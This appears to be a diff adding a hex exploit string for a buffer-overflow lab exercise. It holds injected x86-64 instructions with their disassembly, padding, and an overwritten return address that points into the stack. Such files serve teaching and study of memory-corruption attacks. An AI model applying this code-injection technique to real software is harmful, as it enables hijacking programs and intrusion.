@@ -1,0 +1,10 @@
+c6 04 24 00 /* movb   $0x0,(%rsp) */
+48 8d 64 24 f8 /* lea    -0x8(%rsp),%rsp */
+48 89 e7 /* mov    %rsp,%rdi */
+48 c7 04 24 fa 18 40 /* movq   $0x4018fa,(%rsp) */
+00
+48 bb 35 39 62 39 39 /* movabs $0x6166373939623935,%rbx */
+37 66 61
+c3 /* retq */
+31 31 31 31 31 31 31 31 31 /* padding */
+78 dc 61 55 00 00 00 /* address for injected code */
